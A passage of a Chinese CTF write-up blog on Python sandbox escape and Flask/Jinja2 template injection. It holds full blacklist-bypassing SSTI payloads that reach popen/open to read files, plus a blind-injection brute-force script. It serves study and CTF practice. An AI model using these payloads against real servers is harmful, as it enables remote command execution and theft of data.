+</code></pre><h4 id="string-Template"><a href="#string-Template" class="headerlink" title="string.Template"></a>string.Template</h4><pre><code>&gt;&gt;&gt; from string import Template
+&gt;&gt;&gt; name = &#39;aaa&#39;
+&gt;&gt;&gt; tem = Template(&#39;$name&#39;)
+&gt;&gt;&gt; tem.substitute(name=name)
+&#39;aaa&#39;
+</code></pre><h4 id="format"><a href="#format" class="headerlink" title="format"></a>format</h4><p>python2.6后引用的格式化字符串的函数</p>
+<pre><code>&gt;&gt;&gt; name = &#39;aaa&#39;
+&gt;&gt;&gt; &#39;{}&#39;.format(name)
+&#39;aaa&#39;
+</code></pre><h4 id="f-Strings"><a href="#f-Strings" class="headerlink" title="f-Strings"></a>f-Strings</h4><p>python3.6后新增的字符串格式化方式，可以执行其中的python语句。</p>
+<pre><code>&gt;&gt;&gt; name = &#39;aaa&#39;
+&gt;&gt;&gt; f&#39;{name}&#39;
+&#39;aaa&#39;
+
+&gt;&gt;&gt; f&#39;{name.upper()}&#39;
+&#39;AAA&#39;
+</code></pre><p>如何利用字符串格式化来读取敏感文件</p>
+<pre><code>def view(request, *args, **kwargs):
+    template = &#39;Hello {user}, This is your email: &#39; + request.GET.get(&#39;email&#39;)
+    return HttpResponse(template.format(user=request.user))
+</code></pre><p>如果控制了email参数就是控制了字符串格式化一部分，当传入<code>{user.password}</code>的时候就会显示用户的哈希密码。<code>user</code>是当前上下文中仅有的一个变量，也就是format函数传入的<code>user=request.user</code>，Django中<code>request.user</code>是当前用户对象，这个对象包含一个属性<code>password</code>，也就是该用户的密码。所以，<code>{user.password}</code>实际上就是输出了<code>request.user.password</code>。</p>
+<p>以上代码：<a href="https://xz.aliyun.com/t/288" target="_blank" rel="noopener">Python格式化字符串漏洞</a>，<a href="https://mp.weixin.qq.com/s/Lj4nCz0hag-AKQF_s79fQw" target="_blank" rel="noopener">一文掌握CTF中Python全部考点</a></p>
+<h3 id="CTF-利用"><a href="#CTF-利用" class="headerlink" title="CTF 利用"></a>CTF 利用</h3><p>下面用几个CTF题来感受一下。</p>
+<h4 id="flask-真香"><a href="#flask-真香" class="headerlink" title="flask 真香"></a>flask 真香</h4><p><a href="https://github.com/NJUPT-coding-gay/NCTF2018/tree/master/Web/flask真香" target="_blank" rel="noopener">https://github.com/NJUPT-coding-gay/NCTF2018/tree/master/Web/flask%E7%9C%9F%E9%A6%99</a></p>
+<p>不过这个环境现在搭建会有点问题，flask会使用的是最新1.1.2版本，显示的request.url会先url编码再显示到页面上，需要更改flask版本。</p>
+<p>修改Dockerfile文件:</p>
+<pre><code>RUN pip3 install flask==0.12.1
+RUN pip3 install MarkupSafe==1.0
+RUN pip3 install jinja2==2.9 
+RUN pip3 install Werkzeug==0.14.1
+</code></pre><p>启动后就能愉快的看到页面了</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150449.png" alt="image-20200422144323164"></p>
+<p>禁用了不少关键词，然后使用的session对象来解决，就直接利用上手</p>
+<p>在查找子父类的函数上，<code>__mro__</code>被禁用了，但是<code>__bases__</code>并没有。先找到object类</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150452.png" alt="image-20200422153648190"></p>
+<p>然后再去获取子类，由于class被禁用，<code>__subclasses__</code>不能直接使用。</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150453.png" alt="image-20200422160624948"></p>
+<p>其中可以利用的有open和popen，open在<code>__builtins__</code>里面</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150455.png" alt="image-20200422170120593"></p>
+<p>执行命令查找文件</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150458.png" alt="image-20200422170817564"></p>
+<p>读取文件即可</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150500.png" alt="image-20200422170906003"></p>
+<p>使用open，但是需要知道文件位置</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150502.png" alt="image-20200422171331227"></p>
+<p>如果不想用session，或者session也不能用了，就需要更多的绕过方式，下面会提到这种。</p>
+<pre><code>{{(((()|attr(("_"*2,"cla","ss","_"*2)|join)|attr(("_"*2,"bases","_"*2)|join))[0]|attr(("_"*2,"subcla","sses","_"*2)|join)())[102]|attr(("_"*2,"init","_"*2)|join)|attr(("_"*2,"globals","_"*2)|join)).get('pop'+'en')('cat%20/Th1s__is_S3cret').read()}}
+</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150506.png" alt="image-20200423171734174"></p>
+<h4 id="flask-plus"><a href="#flask-plus" class="headerlink" title="flask plus"></a>flask plus</h4><p><a href="https://github.com/NJUPT-coding-gay/NCTF2018/tree/master/Web/Flask PLUS" target="_blank" rel="noopener">https://github.com/NJUPT-coding-gay/NCTF2018/tree/master/Web/Flask%20PLUS</a></p>
+<p>同样的页面，说明应该是增加了过滤的东西，同样修改Dockerfile文件。</p>
+<p>使用上一个POC，发现<code>__init__</code>被过滤了。至少到这一步是正常的</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150508.png" alt="image-20200423102101580"></p>
+<p>然后只需要把<code>__init__</code>做拼接就行了</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150510.png" alt="image-20200423102442838"></p>
+<p>如果某种情况下不能拼接，或者不想去这么做，也可以去查是否有替代属性。要求能替代<code>__init__</code>，要有<code>__globals__</code>属性。也就是重载过<code>__init__</code></p>
+<pre><code>import os
+
+for i in dir(os._wrap_close):
+    if &#39;__globals__&#39; in dir(eval(&#39;os._wrap_close.&#39;+i)):
+        print(i)
+</code></pre><p>大概符合标准的有</p>
+<pre><code>__enter__   
+__exit__    
+__getattr__ 
+__init__    
+__iter__    
+close       
+</code></pre><p>使用<code>__enter__</code></p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150512.png" alt="image-20200423104717984"></p>
+<p>使用<code>__getattr__</code>，不过这个被禁用了。需要拼接，这就跟上面<code>__init__</code>类似了。更换<code>__iter__</code></p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150514.png" alt="image-20200423104853471"></p>
+<p><code>close</code>也被禁用了。<code>__exit__</code>还可以使用</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150516.png" alt="image-20200423105018271"></p>
+<h4 id="flask-改"><a href="#flask-改" class="headerlink" title="flask 改"></a>flask 改</h4><p>如果在过滤中只过滤了特殊符号，比如<code>__</code>这种，代码</p>
+<pre><code>#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+from flask import Flask,render_template,render_template_string,redirect,request,session,abort,send_from_directory
+import os
+app = Flask(__name__)
+@app.route(&quot;/&quot;)
+def index():
+    &quot;主页&quot;
+    return render_template(&quot;index2.html&quot;)
+
+@app.route(&#39;/user&#39;)
+def user():
+    def safe_jinja(s):
+        blacklist = [&#39;__class__&#39;,&#39;__init__&#39;,&#39;__&#39;]
+        flag = True
+        for no in blacklist:
+            if no.lower() in s.lower():
+               flag= False
+               break
+        return flag
+    template = &#39;&#39;&#39;
+{%% block body %%}
+    &lt;div class=&quot;center-content error&quot;&gt;
+        &lt;h3&gt;%s&lt;/h3&gt;
+    &lt;/div&gt; 
+{%% endblock %%}
+&#39;&#39;&#39; % (request.url)
+
+    if safe_jinja(request.args.get(&#39;name&#39;)):
+        return render_template_string(template)
+    else:
+        return render_template_string(&quot;&lt;h2&gt;NO!&lt;/h2&gt;&quot;)
+
+
+if __name__ == &quot;__main__&quot;:
+    app.run(host=&#39;0.0.0.0&#39;,port=5000)
+</code></pre><p>如果是上面这种对参数过滤的形式，<code>request.args.param</code>来获取新参数的值</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150519.png" alt="image-20200423143634582"></p>
+<p>如果是把<code>[]</code>也过滤掉，就需要用jinja2模板函数来处理，比如<code>attr()</code></p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150521.png" alt="image-20200423144945343"></p>
+<p>构造请求</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150523.png" alt="image-20200423143742243"></p>
+<p>现在可以看到上面过滤掉了<code>__class__</code>，这种也可以采用</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150526.png" alt="image-20200423144033662"></p>
+<p>如何利用这种过滤来获取flag，其中由于中括号被禁用，利用列表的pop方法。但是元组没有pop方法，所以需要先转换成list，再去调用，字典可以使用get()获取键值。原flag文件名带双下划线改成单下划线了。如果其中的某个字符串关键词，比如<code>class</code>被禁用，直接拼接来绕过就行。</p>
+<pre><code>{{(((request|attr(("_"*2,"class","_"*2)|join)|attr(("_"*2,"mro","_"*2)|join)|list).pop(-1)|attr(("_"*2,"subclasses","_"*2)|join)()).pop(258)|attr(("_"*2,"init","_"*2)|join)|attr(("_"*2,"globals","_"*2)|join)).get(("_"*2,"builtins","_"*2)|join).get('open')('Th1s_is_F1114g').read()}}
+</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150528.png" alt="image-20200423155904496"></p>
+<p>原代码中是过滤掉<code>join</code>的，所以这里也可以使用<code>format</code>来处理</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150530.png" alt="image-20200423145253095"></p>
+<p>完整的利用就是</p>
+<pre><code>{{(((request|attr(request.args.f|format(request.args.a))|attr(request.args.f|format(request.args.b))|list).pop(-1)|attr(request.args.f|format(request.args.c))()).pop(118)|attr(request.args.f|format(request.args.d))|attr(request.args.f|format(request.args.e))).get('popen')('cat%20Th1s_is_F1114g').read()}}&amp;f=%s&amp;a=__class__&amp;b=__mro__&amp;c=__subclasses__&amp;d=__init__&amp;e=__globals__
+</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150532.png" alt="image-20200423162231707"></p>
+<p>再如果觉得其他参数中这种形式会被禁用，也可以更多参数分化执行。<code>request.args</code>也可以改为<code>request.values</code>。</p>
+<pre><code>{{(((request|attr(request.args.f|format(request.args.h,request.args.h,request.args.a,request.args.h,request.args.h))|attr(request.args.f|format(request.args.h,request.args.h,request.args.b,request.args.h,request.args.h))|list).pop(-1)|attr(request.args.f|format(request.args.h,request.args.h,request.args.c,request.args.h,request.args.h))()).pop(118)|attr(request.args.f|format(request.args.h,request.args.h,request.args.d,request.args.h,request.args.h))|attr(request.args.f|format(request.args.h,request.args.h,request.args.e,request.args.h,request.args.h))).get('popen')('cat%20Th1s_is_F1114g').read()}}&amp;f=%s%s%s%s%s&amp;h=_&amp;a=class&amp;b=mro&amp;c=subclasses&amp;d=init&amp;e=globals 
+</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150534.png" alt="image-20200423163319930"></p>
+<h4 id="flask-魔改"><a href="#flask-魔改" class="headerlink" title="flask 魔改"></a>flask 魔改</h4><p>如果禁用<code>{{ }}</code>这种符号，同时保持上面符号的禁用。默认的Jinja分隔符配置如下：</p>
+<pre><code>{% ... %}用于声明
+{{ ... }}用于将表达式打印到模板输出
+用于注释不包括在模板输出
+#  ... ##用于行语句
+</code></pre><p>使用if的逻辑语句，由于不能直接用表达式打印，所以用以下布尔判断，循环pop中的值，得到334</p>
+<pre><code>{%%20if%20((request|attr(("_"*2,"class","_"*2)|join)|attr(("_"*2,"mro","_"*2)|join)|list).pop(-1)|attr(("_"*2,"subclasses","_"*2)|join)()).pop(334)|string=="<class%20'os._wrap_close'>"%20%}111{%%20endif%20%}
+</class%20'os._wrap_close'></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150536.png" alt="image-20200424105108660"></p>
+<p>但是最后获取的时候，需要对字符串进行截取，切片已经不能使用了，只能从字符串的方法中查找，可用的恰好有<code>index</code>，<code>find</code>，可以指定范围查找，比如<code>index</code>，指定范围从0开始，结束为1，如果为指定字符串返回正常，不然返回异常。</p>
+<pre><code>{%%20if%20((((request|attr(("_"*2,"class","_"*2)|join)|attr(("_"*2,"mro","_"*2)|join)|list).pop(-1)|attr(("_"*2,"subclasses","_"*2)|join)()).pop(334)|attr(("_"*2,"init","_"*2)|join)|attr(("_"*2,"globals","_"*2)|join)).get('popen')('cat%20Th1s_is_F1114g').read()|string).index('n',0,1)%20%}{%%20endif%20%}
+</code></pre><p>使用类似如下的盲注脚本</p>
+<pre><code># -*- coding: utf-8 -*-
+import requests
+
+def check(payload):
+    url = &#39;http://x.x.x.x:19009/user?name=&#39;+payload
+    r = requests.get(url)
+    if r.status_code == 200:
+        return True
+
+password  = &#39;&#39;
+s = &#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;$()&lt;=&gt;{|}_&#39;
+
+for i in range(0,40):
+    for c in s:
+        payload = &#39;{%%20if%20((((request|attr(("_"*2,"class","_"*2)|join)|attr(("_"*2,"mro","_"*2)|join)|list).pop(-1)|attr(("_"*2,"subclasses","_"*2)|join)()).pop(334)|attr(("_"*2,"init","_"*2)|join)|attr(("_"*2,"globals","_"*2)|join)).get("popen")("cat%20Th1s_is_F1114g").read()|string).index("'+c+'",'+str(i)+','+str(i+1)+')%20%}{%%20endif%20%}&#39; 
+        if check(payload):
+            password += c
+            break
+    print(password)
+</code></pre><p>结果如下</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150543.png" alt="image-20200424120151112"></p>
+<h4 id="flask-究极改"><a href="#flask-究极改" class="headerlink" title="flask 究极改"></a>flask 究极改</h4><p>在把<code>join</code>禁掉，还有<code>format</code>，把<code>values</code>和<code>args</code>也禁掉，不能从其他参数获取，这样上面的绕过就算是不能用了。</p>
+<pre><code>blacklist = [&#39;__class__&#39;,&#39;__&#39;,&#39;[&#39;,&#39;]&#39;,&#39;join&#39;,&#39;values&#39;,&#39;args&#39;,&#39;format&#39;]
+</code></pre><p>查找一个request有关系的属性，尝试<code>form</code>，比如支持POST方法的话。</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150545.png" alt="image-20200424132808887"></p>
+<p>利用cookie参数</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150547.png" alt="image-20200424133033655"></p>
+<p>利用请求头</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150549.png" alt="image-20200424133405205"></p>
+<p>连起来就是，获取object子类。</p>
+<pre><code>{{((request|attr(request.cookies.get('aa'))|attr(request.cookies.get('bb'))|list).pop(-1))|attr(request.cookies.get('cc'))()}}
+
+Cookie: aa=__class__;bb=__mro__;cc=__subclasses__
+</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150550.png" alt="image-20200424140101732"></p>
+<h3 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h3><p>在flask plus中，采用的是session对象来解决问题，虽然在上一题中采用的是元组对象，但是只是因为其中没有禁用join，如果在plus中也禁用了session，还能怎么处理。</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150552.png" alt="image-20200424141236793"></p>
+<p>但实际并没有这么理想</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150555.png" alt="image-20200424145056229"></p>
+<p>这里面能采用的还有哪些，比如</p>
+<pre><code>{{(((redirect|attr('__cla'+'ss__')|attr('__mr'+'o__')|list)[-1]|attr('__subcla'+'sses__')())[342]|attr('__in'+'it__')|attr('__globals__'))['pop'+'en']('cat%20/Th1s_is_F1114g').read()}}
+</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150557.png" alt="image-20200424145127596"></p>
+<p>如果<code>attr</code>被禁用，这种也不能使用，或者能使用<code>__getattribute__</code>替代，但是原代码里已经禁用了。</p>
+<p>文章参考：<a href="https://hatboy.github.io/2018/04/19/Python沙箱逃逸总结" target="_blank" rel="noopener">Python沙箱逃逸总结</a>，<a href="https://xz.aliyun.com/t/52" target="_blank" rel="noopener">Python沙箱逃逸的n种姿势</a>，<a href="https://www.freebuf.com/articles/system/203208.html" target="_blank" rel="noopener">一文看懂Python沙箱逃逸</a>，<a href="https://xz.aliyun.com/t/288" target="_blank" rel="noopener">Python格式化字符串漏洞</a>，<a href="https://mp.weixin.qq.com/s/Lj4nCz0hag-AKQF_s79fQw" target="_blank" rel="noopener">一文掌握CTF中Python全部考点</a>，<a href="https://0day.work/jinja2-template-injection-filter-bypasses/" target="_blank" rel="noopener">Jinja2 template injection filter bypasses</a>，<a href="https://p0sec.net/index.php/archives/120/" target="_blank" rel="noopener">Flask/Jinja2模板注入中的一些绕过姿势</a></p>
+
+          </div>
+          <br><br>
+              
+                <div class="license-wrapper">
+                    <p>原文作者：<a href="">Misaki</a>
+                    <p>原文链接：<a href="/2020/04/python-沙箱逃逸与SSTI/">/2020/04/python-沙箱逃逸与SSTI/</a>
+                    <p>发表日期：<a href="/2020/04/python-沙箱逃逸与SSTI/">April 21st 2020, 9:11:03 am</a>
+                    <p>更新日期：<a href="/2020/04/python-沙箱逃逸与SSTI/">April 24th 2020, 3:38:48 pm</a>
+                    <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+                </div>
+              
+          <br><br>
+          <div>
+              <p>
+                       
+                      <span class="badge badge-default">#&nbsp;python</span>
+                      &nbsp;
+                      
+              </p>
+          </div>
+        </div>
+      </div>  
+    </div>
+  </div>
+  <!-- TOC -->
+  
+      <div class="">
+        <div id="toc">
+          <p class="toc-title"><i class="material-icons" style="vertical-align:middle">toc</i>Toc:</p> 
+          <div id="tocbot"></div>
+        </div>
+      </div>
+  
+</div>
+
+
+<!-- Comments -->
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+    
+        
+            <div class="disqus" style="width:100%">
+    <div id="disqus_thread"></div>
+    <script>               
+        var disqus_shortname = '';
+        var disqus_config = function () {
+            this.page.url = '/2020/04/python-沙箱逃逸与SSTI/'; 
+            this.page.identifier = '/2020/04/python-沙箱逃逸与SSTI/';
+        };
+        (function() { 
+            var d = document, s = d.createElement('script');
+            s.type = 'text/javascript';
+            s.src = '//'+disqus_shortname+'.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>                                
+</div>
+        
+    
+    </div>
+</div>
+  
+
+<footer class="footer footer-default">
+        <div class="container">
+          <div class="float-left" style="padding: 15px 0;">
+              <b>假如今天的你被生活辜负了，别伤心，因为明天生活还会继续辜负你！</b>
+          </div>
+          <div align="right" style="padding: 15px 0;">
+              <i class="iconfont icon-love" ></i>
+              <a href="https://github.com/0x2e/Material-T" target="_blank"> <b>Material-T</b></a>
+          </div>
+        </div>
+</footer>
+      <!--   Core JS Files   -->
+      <script src="/js/core/jquery.min.js?v=3.2.1"></script>
+      <script src="/js/main.js"></script>
+      <script src="/js/core/popper.min.js"></script>
+      <script src="/js/core/bootstrap-material-design.min.js"></script>
+      <script src="/js/plugins/moment.min.js"></script>
+      <script src="/js/material-kit.min.js?v=2.0.5"></script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+        <script src="/js/post.js"></script>
+        <script src="/js/plugins/prettify.js"></script>
+        <script>
+            $(document).ready(function(){
+                $('pre').addClass('prettyprint linenums');
+                prettyPrint();
+            })
+        </script>
+      
+<script src="/live2d-widget/autoload.js"></script>
+</body>
+</html>
